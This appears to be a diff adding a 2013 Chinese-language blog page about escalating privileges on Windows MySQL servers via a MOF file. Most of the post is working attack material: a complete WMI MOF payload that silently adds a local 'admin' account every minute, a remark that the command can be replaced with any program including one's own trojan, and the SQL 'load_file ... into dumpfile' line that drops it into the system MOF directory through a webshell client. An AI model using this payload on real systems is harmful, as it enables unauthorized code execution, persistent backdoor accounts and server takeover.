@@ -1,0 +1,163 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+   <title>mysql mof 提权 &larr; </title>
+   <meta name="author" content="litsand" />
+
+   <link rel="start" href="/" />
+
+	
+	
+	
+  	<link rel="alternate" type="application/atom+xml" href="http://feeds.feedburner.com/feedname" title="RSS feed" />
+	
+	
+
+   <!-- syntax highlighting CSS -->
+   <link rel="stylesheet" href="/assets/themes/mark-reid/css/syntax.css" type="text/css" />
+
+   <!-- Homepage CSS -->
+   <link rel="stylesheet" href="/assets/themes/mark-reid/css/screen.css" type="text/css" />
+
+</head>
+<body id="">
+<div id="site">
+  
+  <div id="header">
+    <h1>
+    	<a href="/" title="normal world">normal world</a>
+    	<span class="byline">&larr; <a href="/">litsand</a></span>
+    </h1>
+    <ul class="nav">
+      <li><a class="home" href="/">Home</a></li>
+      <li><a  href="/archive.html">Archive</a></li>
+      <li><a  href="/pages.html">Pages</a></li>
+      <li><a  href="/categories.html">Categories</a></li>
+      <li><a  href="/tags.html">Tags</a></li>
+    </ul>
+  </div>
+
+  
+<div id="page">
+	
+  <h1 class="emphnext">mysql mof 提权</h1>
+  <ul class="tag_box inline">
+  
+  
+
+
+  
+     
+    	<li><a href="/tags.html#mysql-ref">mysql <span>1</span></a></li>
+    
+  
+
+
+
+  </ul>
+
+  <h2 id='id2563'>参考资料</h2>
+
+<p><a href='http://zone.wooyun.org/content/2273'>mof运行远控</a></p>
+
+<p><a href='http://zone.wooyun.org/content/1806'>windows写权限变成可执行权限的利用</a></p>
+
+<p><a href='http://zone.wooyun.org/content/1795'>利用代码</a></p>
+
+<p><a href='http://www.exploit-db.com/exploits/23083/'>exploitdb</a></p>
+
+<h2 id='id2564'>利用代码</h2>
+
+<ol>
+<li>找个可写目录，我这里是C:\recycler\，把如下代码写到nullevt.mof文件里（也就是他源码里的payload）：</li>
+</ol>
+
+<h1 id='pragma_namespacerootsubscription'>pragma namespace(&#8220;\\.\root\subscription&#8221;)</h1>
+
+<pre><code>instance of __EventFilter as $EventFilter
+{
+EventNamespace = &quot;Root\\Cimv2&quot;;
+Name  = &quot;filtP2&quot;;
+Query = &quot;Select * From __InstanceModificationEvent &quot;
+&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;
+&quot;And TargetInstance.Second = 5&quot;;
+QueryLanguage = &quot;WQL&quot;;
+};
+
+instance of ActiveScriptEventConsumer as $Consumer
+{
+Name = &quot;consPCSV2&quot;;
+ScriptingEngine = &quot;JScript&quot;;
+ScriptText =
+&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin /add\&quot;)&quot;;
+};
+
+instance of __FilterToConsumerBinding
+{
+Consumer   = $Consumer;
+Filter = $EventFilter;
+};</code></pre>
+
+<p>注意上面的net.exe user admin admin /add，可以随便改的，想执行啥都行，有没有参数也都行，执行自己的马也行。 再然后，在菜刀里连接mysql数据库后执行：</p>
+
+<pre><code>select load_file(&#39;C:\\RECYCLER\\nullevt.mof&#39;) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mof&#39;;</code></pre>
+
+<h2 id='id2565'>分析</h2>
+
+<p>本质上是写权限变可执行权限,将mof文件写入特定目录,导致其被执行.</p>
+
+  <address class="signature">
+    <a class="author" href="/">litsand</a> 
+    <span class="date">20 August 2013</span>
+    <span class="location"></span>
+  </address>
+  
+  <div class="prev-next">
+  
+    <a href="/工具使用/2013/08/21/dropboxgithub" class="next" title="用dropbox做git私人仓库">Next Post &rarr;</a>
+  
+  
+    <a href="/渗透测试/2013/08/20/google-hack" class="prev" title="google hack寻找练习目标">&larr; Earlier Post</a>
+  
+  </div>
+  
+</div><!-- End Page -->
+
+
+
+
+  
+  <div id="footer">
+  	<address>
+  		<span class="copyright">
+  			Content by <a href="/info/site.html">litsand</a>. Design by 
+  			<a href="http://mark.reid.name/">Mark Reid</a>
+  			<br/>
+  			(<a rel="licence" href="http://creativecommons.org/licenses/by-nc-sa/3.0/">Some rights reserved</a>)			
+  		</span>
+  		<span class="engine">
+  			Powered by <a href="http://github.com/mojombo/jekyll/" title="A static, minimalist CMS">Jekyll</a>
+  		</span>
+  	</address>
+  </div>
+  
+</div>
+
+<!--[if IE 6]>
+<script type="text/javascript"> 
+	/*Load jQuery if not already loaded*/ if(typeof jQuery == 'undefined'){ document.write("<script type=\"text/javascript\"   src=\"http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js\"></"+"script>"); var __noconflict = true; } 
+	var IE6UPDATE_OPTIONS = {
+		icons_path: "http://static.ie6update.com/hosted/ie6update/images/"
+	}
+</script>
+<script type="text/javascript" src="http://static.ie6update.com/hosted/ie6update/ie6update.js"></script>
+<![endif]-->
+
+  
+</body>
+</html>
+
